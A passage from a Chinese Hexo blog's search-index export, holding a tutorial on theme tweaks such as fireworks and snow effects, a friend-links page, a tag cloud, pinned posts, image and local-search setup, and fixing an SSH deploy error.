radius: anime.random(80, 160),</span><br><span class="line">        lineWidth: 0,</span><br><span class="line">        alpha: &#123;</span><br><span class="line">            value: 0,</span><br><span class="line">            easing: &quot;linear&quot;,</span><br><span class="line">            duration: anime.random(600, 800)</span><br><span class="line">        &#125;,</span><br><span class="line">        duration: anime.random(1200, 1800),</span><br><span class="line">        easing: &quot;easeOutExpo&quot;,</span><br><span class="line">        update: renderParticule,</span><br><span class="line">        offset: 0</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function debounce(e, t) &#123;</span><br><span class="line">    var a;</span><br><span class="line">    return function () &#123;</span><br><span class="line">        var n = this,</span><br><span class="line">            i = arguments;</span><br><span class="line">        clearTimeout(a), a = setTimeout(function () &#123;</span><br><span class="line">            e.apply(n, i)</span><br><span class="line">        &#125;, t)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var canvasEl = document.querySelector(&quot;.fireworks&quot;);</span><br><span class="line">if (canvasEl) &#123;</span><br><span class="line">    var ctx = canvasEl.getContext(&quot;2d&quot;),</span><br><span class="line">        numberOfParticules = 30,</span><br><span class="line">        pointerX = 0,</span><br><span class="line">        pointerY = 0,</span><br><span class="line">        tap = &quot;mousedown&quot;,</span><br><span class="line">        colors = [&quot;#FF1461&quot;, &quot;#18FF92&quot;, &quot;#5A87FF&quot;, &quot;#FBF38C&quot;],</span><br><span class="line">        setCanvasSize = debounce(function () &#123;</span><br><span class="line">            canvasEl.width = 2 * window.innerWidth, canvasEl.height = 2 * window.innerHeight, canvasEl.style.width =</span><br><span class="line">                window.innerWidth + &quot;px&quot;, canvasEl.style.height = window.innerHeight + &quot;px&quot;, canvasEl.getContext(</span><br><span class="line">                    &quot;2d&quot;).scale(2, 2)</span><br><span class="line">        &#125;, 500),</span><br><span class="line">        render = anime(&#123;</span><br><span class="line">            duration: 1 / 0,</span><br><span class="line">            update: function () &#123;</span><br><span class="line">                ctx.clearRect(0, 0, canvasEl.width, canvasEl.height)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    document.addEventListener(tap, function (e) &#123;</span><br><span class="line">        &quot;sidebar&quot; !== e.target.id &amp;&amp; &quot;toggle-sidebar&quot; !== e.target.id &amp;&amp; &quot;A&quot; !== e.target.nodeName &amp;&amp; &quot;IMG&quot; !==</span><br><span class="line">            e.target.nodeName &amp;&amp; (render.play(), updateCoords(e), animateParticules(pointerX, pointerY))</span><br><span class="line">    &#125;, !1), setCanvasSize(), window.addEventListener(&quot;resize&quot;, setCanvasSize, !1)</span><br><span class="line">&#125;</span><br><span class="line">&quot;use strict&quot;;</span><br><span class="line"></span><br><span class="line">function updateCoords(e) &#123;</span><br><span class="line">    pointerX = (e.clientX || e.touches[0].clientX) - canvasEl.getBoundingClientRect().left, pointerY = e.clientY || e.touches[</span><br><span class="line">        0].clientY - canvasEl.getBoundingClientRect().top</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function setParticuleDirection(e) &#123;</span><br><span class="line">    var t = anime.random(0, 360) * Math.PI / 180,</span><br><span class="line">        a = anime.random(50, 180),</span><br><span class="line">        n = [-1, 1][anime.random(0, 1)] * a;</span><br><span class="line">    return &#123;</span><br><span class="line">        x: e.x + n * Math.cos(t),</span><br><span class="line">        y: e.y + n * Math.sin(t)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function createParticule(e, t) &#123;</span><br><span class="line">    var a = &#123;&#125;;</span><br><span class="line">    return a.x = e, a.y = t, a.color = colors[anime.random(0, colors.length - 1)], a.radius = anime.random(16, 32), a.endPos =</span><br><span class="line">        setParticuleDirection(a), a.draw = function () &#123;</span><br><span class="line">            ctx.beginPath(), ctx.arc(a.x, a.y, a.radius, 0, 2 * Math.PI, !0), ctx.fillStyle = a.color, ctx.fill()</span><br><span class="line">        &#125;, a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function createCircle(e, t) &#123;</span><br><span class="line">    var a = &#123;&#125;;</span><br><span class="line">    return a.x = e, a.y = t, a.color = &quot;#F00&quot;, a.radius = 0.1, a.alpha = 0.5, a.lineWidth = 6, a.draw = function () &#123;</span><br><span class="line">        ctx.globalAlpha = a.alpha, ctx.beginPath(), ctx.arc(a.x, a.y, a.radius, 0, 2 * Math.PI, !0), ctx.lineWidth =</span><br><span class="line">            a.lineWidth, ctx.strokeStyle = a.color, ctx.stroke(), ctx.globalAlpha = 1</span><br><span class="line">    &#125;, a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function renderParticule(e) &#123;</span><br><span class="line">    for (var t = 0; t &lt; e.animatables.length; t++) &#123;</span><br><span class="line">        e.animatables[t].target.draw()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function animateParticules(e, t) &#123;</span><br><span class="line">    for (var a = createCircle(e, t), n = [], i = 0; i &lt; numberOfParticules; i++) &#123;</span><br><span class="line">        n.push(createParticule(e, t))</span><br><span class="line">    &#125;</span><br><span class="line">    anime.timeline().add(&#123;</span><br><span class="line">        targets: n,</span><br><span class="line">        x: function (e) &#123;</span><br><span class="line">            return e.endPos.x</span><br><span class="line">        &#125;,</span><br><span class="line">        y: function (e) &#123;</span><br><span class="line">            return e.endPos.y</span><br><span class="line">        &#125;,</span><br><span class="line">        radius: 0.1,</span><br><span class="line">        duration: anime.random(1200, 1800),</span><br><span class="line">        easing: &quot;easeOutExpo&quot;,</span><br><span class="line">        update: renderParticule</span><br><span class="line">    &#125;).add(&#123;</span><br><span class="line">        targets: a,</span><br><span class="line">        radius: anime.random(80, 160),</span><br><span class="line">        lineWidth: 0,</span><br><span class="line">        alpha: &#123;</span><br><span class="line">            value: 0,</span><br><span class="line">            easing: &quot;linear&quot;,</span><br><span class="line">            duration: anime.random(600, 800)</span><br><span class="line">        &#125;,</span><br><span class="line">        duration: anime.random(1200, 1800),</span><br><span class="line">        easing: &quot;easeOutExpo&quot;,</span><br><span class="line">        update: renderParticule,</span><br><span class="line">        offset: 0</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function debounce(e, t) &#123;</span><br><span class="line">    var a;</span><br><span class="line">    return function () &#123;</span><br><span class="line">        var n = this,</span><br><span class="line">            i = arguments;</span><br><span class="line">        clearTimeout(a), a = setTimeout(function () &#123;</span><br><span class="line">            e.apply(n, i)</span><br><span class="line">        &#125;, t)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var canvasEl = document.querySelector(&quot;.fireworks&quot;);</span><br><span class="line">if (canvasEl) &#123;</span><br><span class="line">    var ctx = canvasEl.getContext(&quot;2d&quot;),</span><br><span class="line">        numberOfParticules = 30,</span><br><span class="line">        pointerX = 0,</span><br><span class="line">        pointerY = 0,</span><br><span class="line">        tap = &quot;mousedown&quot;,</span><br><span class="line">        colors = [&quot;#FF1461&quot;, &quot;#18FF92&quot;, &quot;#5A87FF&quot;, &quot;#FBF38C&quot;],</span><br><span class="line">        setCanvasSize = debounce(function () &#123;</span><br><span class="line">            canvasEl.width = 2 * window.innerWidth, canvasEl.height = 2 * window.innerHeight, canvasEl.style.width =</span><br><span class="line">                window.innerWidth + &quot;px&quot;, canvasEl.style.height = window.innerHeight + &quot;px&quot;, canvasEl.getContext(</span><br><span class="line">                    &quot;2d&quot;).scale(2, 2)</span><br><span class="line">        &#125;, 500),</span><br><span class="line">        render = anime(&#123;</span><br><span class="line">            duration: 1 / 0,</span><br><span class="line">            update: function () &#123;</span><br><span class="line">                ctx.clearRect(0, 0, canvasEl.width, canvasEl.height)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    document.addEventListener(tap, function (e) &#123;</span><br><span class="line">        &quot;sidebar&quot; !== e.target.id &amp;&amp; &quot;toggle-sidebar&quot; !== e.target.id &amp;&amp; &quot;A&quot; !== e.target.nodeName &amp;&amp; &quot;IMG&quot; !==</span><br><span class="line">            e.target.nodeName &amp;&amp; (render.play(), updateCoords(e), animateParticules(pointerX, pointerY))</span><br><span class="line">    &#125;, !1), setCanvasSize(), window.addEventListener(&quot;resize&quot;, setCanvasSize, !1)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>打开<code>themes/next/layout/_layout.swig</code>,在<code>&lt;/body&gt;</code>上面写下如下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;canvas class=&quot;fireworks&quot; style=&quot;position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;&quot; &gt;&lt;/canvas&gt; </span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;//cdn.bootcss.com/animejs/2.2.0/anime.min.js&quot;&gt;&lt;/script&gt; </span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;/js/fireworks.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>打开主题配置文件，最后填上：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Fireworks</span><br><span class="line">fireworks: true</span><br></pre></td></tr></table></figure>

<h1 id="添加雪花飘落效果"><a href="#添加雪花飘落效果" class="headerlink" title="添加雪花飘落效果"></a>添加雪花飘落效果</h1><p>、在<code>themes/matery/source/js</code>目录下新建<code>snow.js</code>文件，将内容复制粘贴到<code>snow.js</code>即可：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(function($)&#123;</span><br><span class="line">	$.fn.snow = function(options)&#123;</span><br><span class="line">	var $flake = $(&#x27;&lt;div id=&quot;snowbox&quot; /&gt;&#x27;).css(&#123;&#x27;position&#x27;: &#x27;absolute&#x27;,&#x27;z-index&#x27;:&#x27;9999&#x27;, &#x27;top&#x27;: &#x27;-50px&#x27;&#125;).html(&#x27;&amp;#10052;&#x27;),</span><br><span class="line">	documentHeight 	= $(document).height(),</span><br><span class="line">	documentWidth	= $(document).width(),</span><br><span class="line">	defaults = &#123;</span><br><span class="line">		minSize		: 10,</span><br><span class="line">		maxSize		: 20,</span><br><span class="line">		newOn		: 1000,</span><br><span class="line">		flakeColor	: &quot;#AFDAEF&quot; /* 此处可以定义雪花颜色，若要白色可以改为#FFFFFF */</span><br><span class="line">	&#125;,</span><br><span class="line">	options	= $.extend(&#123;&#125;, defaults, options);</span><br><span class="line">	var interval= setInterval( function()&#123;</span><br><span class="line">	var startPositionLeft = Math.random() * documentWidth - 100,</span><br><span class="line">	startOpacity = 0.5 + Math.random(),</span><br><span class="line">	sizeFlake = options.minSize + Math.random() * options.maxSize,</span><br><span class="line">	endPositionTop = documentHeight - 200,</span><br><span class="line">	endPositionLeft = startPositionLeft - 500 + Math.random() * 500,</span><br><span class="line">	durationFall = documentHeight * 10 + Math.random() * 5000;</span><br><span class="line">	$flake.clone().appendTo(&#x27;body&#x27;).css(&#123;</span><br><span class="line">		left: startPositionLeft,</span><br><span class="line">		opacity: startOpacity,</span><br><span class="line">		&#x27;font-size&#x27;: sizeFlake,</span><br><span class="line">		color: options.flakeColor</span><br><span class="line">	&#125;).animate(&#123;</span><br><span class="line">		top: endPositionTop,</span><br><span class="line">		left: endPositionLeft,</span><br><span class="line">		opacity: 0.2</span><br><span class="line">	&#125;,durationFall,&#x27;linear&#x27;,function()&#123;</span><br><span class="line">		$(this).remove()</span><br><span class="line">	&#125;);</span><br><span class="line">	&#125;, options.newOn);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)(jQuery);</span><br><span class="line">$(function()&#123;</span><br><span class="line">    $.fn.snow(&#123; </span><br><span class="line">	    minSize: 5, /* 定义雪花最小尺寸 */</span><br><span class="line">	    maxSize: 50,/* 定义雪花最大尺寸 */</span><br><span class="line">	    newOn: 300  /* 定义密集程度，数字越小越密集 */</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>然后再<code>themes/matery/layout/layout.ejs</code>文件内添加下面的内容：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;/js/snow.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="设置博文内链接为蓝色"><a href="#设置博文内链接为蓝色" class="headerlink" title="设置博文内链接为蓝色"></a>设置博文内链接为蓝色</h1><p>打开<code>themes/next/source/css/_common/components/post/post.styl</code>文件，将下面的代码复制到文件最后：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.post-body p a&#123;</span><br><span class="line">     color: #0593d3;</span><br><span class="line">     border-bottom: none;</span><br><span class="line">     &amp;:hover &#123;</span><br><span class="line">       color: #0477ab;</span><br><span class="line">       text-decoration: underline;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<h1 id="友链"><a href="#友链" class="headerlink" title="友链"></a>友链</h1><h2 id="在博客页面新建页面"><a href="#在博客页面新建页面" class="headerlink" title="在博客页面新建页面"></a>在博客页面新建页面</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new page links</span><br></pre></td></tr></table></figure>

<p>这点需要注意，输入这个指令后会在根目录/source下生成一个links文件夹，打开其中的index.md文件，注意一定要在头部写上如下，尤其注意type！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 友链</span><br><span class="line">date: 2022-01-18 10:00:39</span><br><span class="line">type: &quot;links&quot;</span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<p>如果不想让这个页面有评论，就再加一个comment。</p>
<h2 id="配置-menu"><a href="#配置-menu" class="headerlink" title="配置 menu"></a>配置 menu</h2><p>主题配置文件下在<code>menu</code>下添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">links: /links/ || link</span><br></pre></td></tr></table></figure>

<p>在 <code>/themes/next/languages/zh-CN.yml</code> 文件中 <code>menu</code> 下增加中文描述</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">links: 友链</span><br></pre></td></tr></table></figure>

<h2 id="新增-links-swig-页"><a href="#新增-links-swig-页" class="headerlink" title="新增 links.swig 页"></a>新增 links.swig 页</h2><p>在 <code>/themes/next/layout/</code> 新建 links.swig，内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &#123;% block content %&#125;</span><br><span class="line">  &#123;######################&#125;</span><br><span class="line">  &#123;### LINKS BLOCK ###&#125;</span><br><span class="line">  &#123;######################&#125;</span><br><span class="line"></span><br><span class="line">    &lt;div id=&quot;links&quot;&gt;</span><br><span class="line">        &lt;style&gt;</span><br><span class="line"></span><br><span class="line">            #links&#123;</span><br><span class="line">               margin-top: 5rem;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            .links-content&#123;</span><br><span class="line">                margin-top:1rem;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            .link-navigation::after &#123;</span><br><span class="line">                content: &quot; &quot;;</span><br><span class="line">                display: block;</span><br><span class="line">                clear: both;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            .card &#123;</span><br><span class="line">                width: 300px;</span><br><span class="line">                font-size: 1rem;</span><br><span class="line">                padding: 10px 20px;</span><br><span class="line">                border-radius: 4px;</span><br><span class="line">                transition-duration: 0.15s;</span><br><span class="line">                margin-bottom: 1rem;</span><br><span class="line">                display:flex;</span><br><span class="line">            &#125;</span><br><span class="line">            .card:nth-child(odd) &#123;</span><br><span class="line">                float: left;</span><br><span class="line">            &#125;</span><br><span class="line">            .card:nth-child(even) &#123;</span><br><span class="line">                float: right;</span><br><span class="line">            &#125;</span><br><span class="line">            .card:hover &#123;</span><br><span class="line">                transform: scale(1.1);</span><br><span class="line">                box-shadow: 0 2px 6px 0 rgba(0, 0, 0, 0.12), 0 0 6px 0 rgba(0, 0, 0, 0.04);</span><br><span class="line">            &#125;</span><br><span class="line">            .card a &#123;</span><br><span class="line">                border:none;</span><br><span class="line">            &#125;</span><br><span class="line">            .card .ava &#123;</span><br><span class="line">                width: 3rem!important;</span><br><span class="line">                height: 3rem!important;</span><br><span class="line">                margin:0!important;</span><br><span class="line">                margin-right: 1em!important;</span><br><span class="line">                border-radius:4px;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            .card .card-header &#123;</span><br><span class="line">                font-style: italic;</span><br><span class="line">                overflow: hidden;</span><br><span class="line">                width: 236px;</span><br><span class="line">            &#125;</span><br><span class="line">            .card .card-header a &#123;</span><br><span class="line">                font-style: normal;</span><br><span class="line">                color: #2bbc8a;</span><br><span class="line">                font-weight: bold;</span><br><span class="line">                text-decoration: none;</span><br><span class="line">            &#125;</span><br><span class="line">            .card .card-header a:hover &#123;</span><br><span class="line">                color: #d480aa;</span><br><span class="line">                text-decoration: none;</span><br><span class="line">            &#125;</span><br><span class="line">            .card .card-header .info &#123;</span><br><span class="line">                font-style:normal;</span><br><span class="line">                color:#a3a3a3;</span><br><span class="line">                font-size:14px;</span><br><span class="line">                min-width: 0;</span><br><span class="line">                text-overflow: ellipsis;</span><br><span class="line">                overflow: hidden;</span><br><span class="line">                white-space: nowrap;</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;/style&gt;</span><br><span class="line">        &lt;div class=&quot;links-content&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;link-navigation&quot;&gt;</span><br><span class="line"></span><br><span class="line">                &#123;% for link in theme.mylinks %&#125;</span><br><span class="line"></span><br><span class="line">                    &lt;div class=&quot;card&quot;&gt;</span><br><span class="line">                        &lt;img class=&quot;ava&quot; src=&quot;&#123;&#123; link.avatar &#125;&#125;&quot;/&gt;</span><br><span class="line">                        &lt;div class=&quot;card-header&quot;&gt;</span><br><span class="line">                           &lt;div&gt;</span><br><span class="line">                              &lt;a href=&quot;&#123;&#123; link.site &#125;&#125;&quot; target=&quot;_blank&quot;&gt; &#123;&#123; link.nickname &#125;&#125;&lt;/a&gt;</span><br><span class="line">                              &lt;a href=&quot;&#123;&#123; link.site &#125;&#125;&quot; target=&quot;_blank&quot;&gt;&lt;span class=&quot;focus-links&quot;&gt;关注&lt;/span&gt;&lt;/a&gt;</span><br><span class="line">                           &lt;/div&gt;</span><br><span class="line">                           &lt;div class=&quot;info&quot;&gt;&#123;&#123; link.info &#125;&#125;&lt;/div&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">                &#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &#123;&#123; page.content &#125;&#125;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">  &#123;##########################&#125;</span><br><span class="line">  &#123;### END LINKS BLOCK ###&#125;</span><br><span class="line">  &#123;##########################&#125;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>

<h2 id="修改-page-swig"><a href="#修改-page-swig" class="headerlink" title="修改 page.swig"></a>修改 page.swig</h2><p>修改 <code>/themes/next/layout/page.swig</code> 文件，在开头附近添加如下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% elif page.type === &#x27;links&#x27; and not page.title %&#125;</span><br><span class="line">&#123;&#123; __(&#x27;title.links&#x27;) + page_title_suffix &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>大概位置如图：</p>
<p><img src="/2022/01/11/%E5%8D%9A%E5%AE%A2%E5%88%B6%E4%BD%9C%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/image-20220118100857169.png" alt="image-20220118100857169"></p>
<h2 id="引入-links-swig"><a href="#引入-links-swig" class="headerlink" title="引入 links.swig"></a>引入 links.swig</h2><p>接着在 <code>/themes/next/layout/page.swig</code> 中 <code>PAGE BODY</code> 内部，引入刚才新建的 <code>page.swig</code> :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% elif page.type === &#x27;links&#x27; %&#125;</span><br><span class="line">    &#123;% include &#x27;links.swig&#x27; %&#125;</span><br></pre></td></tr></table></figure>

<p>添加位置不唯一，我添加的是这：</p>
<p><img src="/2022/01/11/%E5%8D%9A%E5%AE%A2%E5%88%B6%E4%BD%9C%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/image-20220118100921527.png" alt="image-20220118100921527"></p>
<h2 id="配置友链"><a href="#配置友链" class="headerlink" title="配置友链"></a>配置友链</h2><p>到这里关于友链的配置就完成了，接下来，在 <code>/themes/next/_config.yml</code> 文件中配置友链，末尾处新增 <code>mylinks</code> ，如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mylinks:</span><br><span class="line"># 名称：风尘孤狼</span><br><span class="line"># 地址：https://hzy2003628.top/</span><br><span class="line"># 描述：</span><br><span class="line"># 头像：https://hzy2003628.top/images/avatar.png</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- nickname: 影影的家  #友链名称</span><br><span class="line">  site: https://wsy2003328.top/  #友链地址</span><br><span class="line">  info: 流年，谁给过的倾城。  #友链说明</span><br><span class="line">  avatar: https://wsy2003328.top/images/avatar.png  #友链头像</span><br></pre></td></tr></table></figure>

<h1 id="添加标签云"><a href="#添加标签云" class="headerlink" title="添加标签云"></a>添加标签云</h1><h2 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-tag-cloud@^2.0.* --save</span><br></pre></td></tr></table></figure>

<h2 id="配置插件（因为我的博客是swig，所以只说明swig的相关配置）"><a href="#配置插件（因为我的博客是swig，所以只说明swig的相关配置）" class="headerlink" title="配置插件（因为我的博客是swig，所以只说明swig的相关配置）"></a>配置插件（因为我的博客是swig，所以只说明swig的相关配置）</h2><p>在主题文件夹找到文件 <code>theme/next/layout/_macro/sidebar.swig</code>, 然后添加如下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% if site.tags.length &gt; 1 %&#125;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; charset=&quot;utf-8&quot; src=&quot;/js/tagcloud.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; charset=&quot;utf-8&quot; src=&quot;/js/tagcanvas.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;div class=&quot;widget-wrap&quot;&gt;</span><br><span class="line">    &lt;h3 class=&quot;widget-title&quot;&gt;标签云&lt;/h3&gt;</span><br><span class="line">    &lt;div id=&quot;myCanvasContainer&quot; class=&quot;widget tagcloud&quot;&gt;</span><br><span class="line">        &lt;canvas width=&quot;250&quot; height=&quot;250&quot; id=&quot;resCanvas&quot; style=&quot;width=100%&quot;&gt;</span><br><span class="line">            &#123;&#123; list_tags() &#125;&#125;</span><br><span class="line">        &lt;/canvas&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<h2 id="主题配置"><a href="#主题配置" class="headerlink" title="主题配置"></a>主题配置</h2><p>博文置在next主题根目录，找到 <code>_config.yml</code>配置文件然后在最后添加如下的配置项，可以自定义标签云的字体和颜色，还有突出高亮:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># hexo-tag-cloud</span><br><span class="line">tag_cloud:</span><br><span class="line">    textFont: Trebuchet MS, Helvetica</span><br><span class="line">    textColor: &#x27;#333&#x27; //字体颜色</span><br><span class="line">    textHeight: 25 //字体高度</span><br><span class="line">    outlineColor: &#x27;#E2E1D1&#x27;</span><br><span class="line">    maxSpeed: 0.1 //文字滚动速度</span><br></pre></td></tr></table></figure>

<h1 id="博文置顶"><a href="#博文置顶" class="headerlink" title="博文置顶"></a>博文置顶</h1><h3 id="安装插件-1"><a href="#安装插件-1" class="headerlink" title="安装插件"></a>安装插件</h3><p>在根目录Blog打开Git Bash，执行下面的命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm uninstall hexo-generator-index --save</span><br><span class="line">npm install hexo-generator-index-pin-top --save</span><br></pre></td></tr></table></figure>

<h3 id="设置置顶标志"><a href="#设置置顶标志" class="headerlink" title="设置置顶标志"></a>设置置顶标志</h3><p>打开blog/themes/next/layout/_macro目录下的post.swig文件，定位到<div class="post-meta">标签下，插入如下代码：</div></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% if post.top %&#125;</span><br><span class="line">  &lt;i class=&quot;fa fa-thumb-tack&quot;&gt;&lt;/i&gt;</span><br><span class="line">  &lt;font color=7D26CD&gt;置顶&lt;/font&gt;</span><br><span class="line">  &lt;span class=&quot;post-meta-divider&quot;&gt;|&lt;/span&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<h3 id="在文章中添加top"><a href="#在文章中添加top" class="headerlink" title="在文章中添加top"></a>在文章中添加top</h3><p>然后在需要置顶的文章的Front-matter中加上top: true即可，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: Hello World</span><br><span class="line"></span><br><span class="line">top: true</span><br><span class="line"></span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<h1 id="博客不显示图片"><a href="#博客不显示图片" class="headerlink" title="博客不显示图片"></a>博客不显示图片</h1><p>在写博客的过程中难免需要插图，而有时候在插图时在博客中无法正常显示图片，这个时候就需要以下几个步骤：</p>
<h2 id="修改博客根目录中-config-yml文件的配置项post-asset-folder为true"><a href="#修改博客根目录中-config-yml文件的配置项post-asset-folder为true" class="headerlink" title="修改博客根目录中_config.yml文件的配置项post_asset_folder为true"></a>修改博客根目录中<code>_config.yml</code>文件的配置项<code>post_asset_folder</code>为<code>true</code></h2><blockquote>
<p>post_asset_folder: true</p>
</blockquote>
<p>完成此设置后，当你通过<code>hexo new 文件名</code>新建博客后，会产生一个和文件同名的文件夹。</p>
<p><img src="/2022/01/11/%E5%8D%9A%E5%AE%A2%E5%88%B6%E4%BD%9C%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/webp.webp" alt=" "></p>
<h2 id="在博客根目录中下使用npm安装插件"><a href="#在博客根目录中下使用npm安装插件" class="headerlink" title="在博客根目录中下使用npm安装插件"></a>在博客根目录中下使用npm安装插件</h2><p>（回到博客根目录下在空白部分点右键，进入<code>git bush here</code>）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install https://github.com/CodeFalling/hexo-asset-image --save</span><br></pre></td></tr></table></figure>

<p>完成以上步骤后就可以正常插图了！在这里再强调一下插图的语法是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">![ ]( )</span><br></pre></td></tr></table></figure>

<p>然后选择对路径之后就会正常显示图片！</p>
<h1 id="Hexo博客添加搜索功能"><a href="#Hexo博客添加搜索功能" class="headerlink" title="Hexo博客添加搜索功能"></a>Hexo博客添加搜索功能</h1><p>安装插件，在博客根目录执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>

<p>修改根目录下的<code>_config.yml</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 10000</span><br><span class="line">  content: true</span><br></pre></td></tr></table></figure>

<p>修改主题配置文件./themes/next下的<code>_config.yml</code>文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">local_search:</span><br><span class="line">	enable: true</span><br></pre></td></tr></table></figure>
<h1 id="部署时发生error：spawn-failed错误"><a href="#部署时发生error：spawn-failed错误" class="headerlink" title="部署时发生error：spawn failed错误"></a>部署时发生error：spawn failed错误</h1><p>首先用<code>ssh -T git@github.com</code>命令测试是否连接，如果不能连接的话，在存放key的目录下新建config文件</p>
<p><img src="/2022/01/11/%E5%8D%9A%E5%AE%A2%E5%88%B6%E4%BD%9C%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/MO22Ie.png" alt="MO22Ie.png"></p>
<p>填入以下内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">User 你GitHub的邮箱</span><br><span class="line">Hostname ssh.github.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line">Port 443</span><br></pre></td></tr></table></figure>

<p>如果可以正常连接的话，回到博客的根目录，打开_config.yml配置文件</p>
<p>修改以下内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line"></span><br><span class="line">type: git</span><br><span class="line"></span><br><span class="line">repo: https://github.com/yourname/yourname.github.io.git</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">branch: master</span><br></pre></td></tr></table></figure>

<p>其中的repo修改为</p>
<p><code>git@github.com:yourname/yourname.github.io.git</code></p>
]]></content>
      <categories>
        <category>博客相关问题类</category>
      </categories>
      <tags>
        <tag>博客部分问题解决方法</tag>
        <tag>常用指令</tag>
        <tag>博客主题优化</tag>
      </tags>
  </entry>
</search>
